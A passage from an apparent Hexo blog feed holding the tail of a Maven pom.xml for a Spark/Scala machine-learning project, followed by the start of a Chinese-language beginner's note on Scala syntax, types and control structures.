class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testCompile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">scalaVersion</span>&gt;</span>2.11.4<span class="tag">&lt;/<span class="name">scalaVersion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.SF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.DSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.RSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.AppendingTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span>reference.conf<span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">Main-Class</span>&gt;</span><span class="tag">&lt;/<span class="name">Main-Class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-hive_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-client&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-common&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;spark-streaming-kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;2.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-mllib_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;SparkML也是个大坑，先在这里贴上pom文件&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Spark机器学习案例实战" scheme="http://yoursite.com/categories/Reading-notes/Spark%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Scala Note</title>
    <link href="http://yoursite.com/2019/06/18/Scala%20Note/"/>
    <id>http://yoursite.com/2019/06/18/Scala Note/</id>
    <published>2019-06-18T07:40:44.186Z</published>
    <updated>2019-08-16T08:06:13.674Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>开一个新坑，Scala这门语言在优化上有很大的操作余地，需要相当的熟练度。本文仅做基础笔记的整理。</p></blockquote><a id="more"></a> <h1 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h1><h2 id="Scala-介绍"><a href="#Scala-介绍" class="headerlink" title="Scala 介绍"></a>Scala 介绍</h2><p>Scala 是 Scalable Language 的简写，是一门多范式的编程语言</p><p>联邦理工学院洛桑（EPFL）的Martin Odersky于2001年基于Funnel的工作开始设计Scala。</p><p>Funnel是把函数式编程思想和Petri网相结合的一种编程语言。</p><p>Odersky先前的工作是Generic Java和javac（Sun Java编译器）。Java平台的Scala于2003年底/2004年初发布。.NET平台的Scala发布于2004年6月。该语言第二个版本，v2.0，发布于2006年3月。</p><p>截至2009年9月，最新版本是版本2.7.6 。Scala 2.8预计的特性包括重写的Scala类库（Scala collections library）、方法的命名参数和默认参数、包对象（package object），以及Continuation。</p><p>2009年4月，Twitter宣布他们已经把大部分后端程序从Ruby迁移到Scala，其余部分也打算要迁移。此外， Wattzon已经公开宣称，其整个平台都已经是基于Scala基础设施编写的。</p><hr><h2 id="环境部分："><a href="#环境部分：" class="headerlink" title="环境部分："></a>环境部分：</h2><p>安装：和Java一样也要配置环境变量</p><p>配置IDEA：</p><p>先安装插件Scala</p><p>然后创建Maven项目</p><p>因为Maven默认不支持Scala</p><p>创建完毕之后</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3izm7uublj20f30ch0t5.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3izmsgpxxj20pw0lnab5.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3iznzcv6ej20sw0o13zt.jpg" alt></p><p>Scala文件夹标记为Source</p><h2 id="语法部分"><a href="#语法部分" class="headerlink" title="语法部分"></a>语法部分</h2><h3 id="Hello-Scala"><a href="#Hello-Scala" class="headerlink" title="Hello Scala"></a>Hello Scala</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">HelloScala</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"hello Scala"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令台执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scala -cp C:\Users\61661\Desktop\scala-1.0-SNAPSHOT.jar HelloScala</span><br></pre></td></tr></table></figure><h3 id="声明值和变量"><a href="#声明值和变量" class="headerlink" title="声明值和变量"></a>声明值和变量</h3><p>Scala声明变量有两种方式：<code>val</code> 和 <code>var</code></p><p><code>val</code>定义的值是不可变的，它不是一个常量，是不可变量，或者称之为只读变量。</p><p>Tips：</p><ol><li>Scala的匿名变量（为了运行程序，系统自动添加的变量）分配<code>val</code>。</li><li><code>val</code>定义的变量虽然不能改变其引用的内存地址，但是可以改变其引用的对象的内部的其他属性值。</li><li>为了减少可变性引起的bug，应该尽可能地使用不可变变量。变量类型可以省略，解析器会根据值进行推断。<code>val</code>和<code>var</code>声明变量时都必须初始化。</li></ol><h3 id="常用类型"><a href="#常用类型" class="headerlink" title="常用类型"></a>常用类型</h3><p>8种常用类型</p><table><thead><tr><th>类型</th><th>属性</th></tr></thead><tbody><tr><td>Boolean</td><td><code>true</code> 或者 <code>false</code></td></tr><tr><td>Byte</td><td>8位， 有符号</td></tr><tr><td>Short</td><td>16位， 有符号</td></tr><tr><td>Int</td><td>32位， 有符号</td></tr><tr><td>Long</td><td>64位， 有符号</td></tr><tr><td>Char</td><td>16位， 无符号</td></tr><tr><td>Float</td><td>32位， 单精度浮点数</td></tr><tr><td>Double</td><td>64位， 双精度浮点数</td></tr><tr><td>String</td><td>由Char数组组成</td></tr></tbody></table><p>与Java中的数据类型不同，Scala并不区分基本类型和引用类型，所以这些类型<strong>都是对象</strong></p><p>可以调用相对应的方法，String直接使用的是<code>java.lang.String</code></p><p>由于String实际是一系列Char的不可变的集合，Scala中大部分针对集合的操作，都可以用于String，具体来说，String的这些方法存在于类<code>scala.collection.immutable.StringOps</code>中。</p><p>由于String在需要时能隐式转换为<code>StringOps</code>，因此不需要任何额外的转换，String就可以使用这些方法。</p><p>每一种数据类型都有对应的<code>Rich*</code>类型，如<code>RichInt</code>、<code>RichChar</code>等，为基本类型提供了更多的有用操作。</p><h3 id="常用类型结构图"><a href="#常用类型结构图" class="headerlink" title="常用类型结构图"></a>常用类型结构图</h3><p>Scala中，所有的值都是类对象，而所有的类，包括值类型，都最终继承自一个统一的根类型<code>Any</code>。统一类型，是Scala的又一大特点。更特别的是，Scala中还定义了几个底层类<code>Bottom Class</code>，比如<code>Null</code>和<code>Nothing</code>。</p><ol><li><code>Null</code>是所有引用类型的子类型，而<code>Nothing</code>是所有类型的子类型。<code>Null</code>类只有一个实例对象，<code>null</code>，类似于Java中的<code>null</code>引用。<code>null</code>可以赋值给任意引用类型，但是不能赋值给值类型。</li><li><code>Nothing</code>，可以作为没有正常返回值的方法的返回类型，非常直观的告诉你这个方法不会正常返回，而且由于<code>Nothing</code>是其他任意类型的子类，他还能跟要求返回值的方法兼容。</li><li><code>Unit</code>类型用来标识过程，也就是没有明确返回值的函数。 由此可见，<code>Unit</code>类似于<code>Java</code>里的<code>void</code>。<code>Unit</code>只有一个实例，()，这个实例也没有实质的意义。</li></ol><p>关系图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3jcuo85e8j20of0gtta1.jpg" alt></p><h3 id="算数操作符重载"><a href="#算数操作符重载" class="headerlink" title="算数操作符重载"></a>算数操作符重载</h3><p><code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code>可以完成和Java中相同的工作，但是有一点区别，他们都是方法。你几乎可以用任何符号来为方法命名。</p><p><code>1 + 2</code> 等同于 <code>1.+(2)</code></p><p>Tips: Scala中没有++、–操作符，需要通过+=、-=来实现同样的效果。</p><h3 id="调用函数与方法"><a href="#调用函数与方法" class="headerlink" title="调用函数与方法"></a>调用函数与方法</h3><p>在Scala中，一般情况下我们不会刻意的去区分<code>函数</code>与<code>方法</code>的区别，但是他们确实是不同的东西。</p><p>后面我们再详细探讨。首先我们要学会使用Scala来调用函数与方法。</p><h4 id="1-调用函数，求方根"><a href="#1-调用函数，求方根" class="headerlink" title="1.调用函数，求方根"></a>1.调用函数，求方根</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.math</span><br><span class="line">sqrt(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="2-调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）"><a href="#2-调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）" class="headerlink" title="2.调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）"></a>2.调用方法，静态方法（Scala中没有静态方法这个概念，需要通过伴生类对象来实现）</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInt</span>.probablePrime(<span class="number">16</span>, scala.util.<span class="type">Random</span>)</span><br></pre></td></tr></table></figure><h4 id="3-调用方法，非静态方法，使用对象调用"><a href="#3-调用方法，非静态方法，使用对象调用" class="headerlink" title="3.调用方法，非静态方法，使用对象调用"></a>3.调用方法，非静态方法，使用对象调用</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"HelloWorld"</span>.distinct</span><br></pre></td></tr></table></figure><h4 id="4-apply与update方法"><a href="#4-apply与update方法" class="headerlink" title="4.apply与update方法"></a>4.apply与update方法</h4><p>apply方法是调用时可以省略方法名的方法。用于构造和获取元素：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Hello"</span>(<span class="number">4</span>)  等同于  <span class="string">"Hello"</span>.apply(<span class="number">4</span>)</span><br><span class="line"><span class="type">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) 等同于 <span class="type">Array</span>.apply(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">如：</span><br><span class="line">println(<span class="string">"Hello"</span>(<span class="number">4</span>))</span><br><span class="line">println(<span class="string">"Hello"</span>.apply(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>在<code>StringOps</code>中你会发现一个 <code>def apply(n: Int): Char</code>方法定义。<code>update</code>方法也是调用时可以省略方法名的方法，用于元素的更新：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr(<span class="number">4</span>) = <span class="number">5</span>  等同于  arr.update(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">如：</span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">5</span>)</span><br><span class="line">arr1(<span class="number">1</span>) = <span class="number">2</span></span><br><span class="line">arr1.update(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">println(arr1.mkString(<span class="string">","</span>))</span><br></pre></td></tr></table></figure><h4 id="Option类型"><a href="#Option类型" class="headerlink" title="Option类型"></a>Option类型</h4><p>Scala为单个值提供了对象的包装器，表示为那种可能存在也可能不存在的值。他只有两个有效的子类对象，一个是Some，表示某个值，另外一个是None，表示为空，通过Option的使用，避免了使用null、空字符串等方式来表示缺少某个值的做法。</p><p>如：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> map1 = <span class="type">Map</span>(<span class="string">"Alice"</span> -&gt; <span class="number">20</span>, <span class="string">"Bob"</span> -&gt; <span class="number">30</span>)</span><br><span class="line">println(map1.get(<span class="string">"Alice"</span>))</span><br><span class="line">println(map1.get(<span class="string">"Jone"</span>))</span><br></pre></td></tr></table></figure><h3 id="控制结构和函数"><a href="#控制结构和函数" class="headerlink" title="控制结构和函数"></a>控制结构和函数</h3><h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><p>Scala中没有三目运算符，因为根本不需要。Scala中if else表达式是有返回值的，如果if或者else返回的类型不一样，就返回Any类型（所有类型的公共超类型）。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a3 = <span class="number">10</span></span><br><span class="line">    <span class="keyword">val</span> a4 =</span><br><span class="line">      <span class="comment">//返回类型一样</span></span><br><span class="line">      <span class="keyword">if</span>(a3 &gt; <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="string">"a3大于20"</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="string">"a3小于20"</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">val</span> a5 = </span><br><span class="line">      <span class="keyword">if</span>(a3 &gt; <span class="number">20</span>)&#123;</span><br><span class="line">          <span class="string">"a3大于20"</span></span><br><span class="line">      &#125;</span><br><span class="line">    println(a4)</span><br><span class="line">    <span class="comment">//a3小于20</span></span><br><span class="line">    println(a5)</span><br><span class="line">    <span class="comment">//()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果缺少一个判断，什么都没有返回，但是Scala认为任何表达式都会有值，对于空值，使用Unit类，写做()，叫做无用占位符，相当于Java中的void。</p><p>Tips: 行尾的位置不需要分号，只要能够从上下文判断出语句的终止即可。但是如果在单行中写多个语句，则需要分号分割。在Scala中，{}块包含一系列表达式，其结果也是一个表达式。块中最后一个表达式的值就是块的值。</p><h4 id="while-表达式"><a href="#while-表达式" class="headerlink" title="while 表达式"></a>while 表达式</h4><p>Scala提供和Java一样的while和do循环，与If语句不同，While语句本身没有值，即整个While语句的结果是Unit类型的()。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">val</span> while1 = <span class="keyword">while</span>(n &lt;= <span class="number">10</span>)&#123;</span><br><span class="line">      n += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println(while1) <span class="comment">//()</span></span><br><span class="line">    println(n) <span class="comment">//11</span></span><br><span class="line">    <span 